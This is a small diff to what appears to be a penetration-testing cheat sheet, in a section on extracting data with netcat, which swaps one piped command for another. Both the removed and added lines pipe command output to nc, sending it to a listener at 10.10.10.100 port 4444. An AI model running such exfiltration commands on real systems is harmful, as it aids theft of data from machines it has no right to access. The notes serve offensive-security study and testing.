@@ -269,7 +269,7 @@ chmod +x linpeas.sh
 # Extraction
 ## Send command output with `netcat`
 ```bash
-whoami | nc 10.10.10.100 4444
+which busybox | nc 10.10.10.100 4444
 ```
 
 ## Send directory with `netcat`
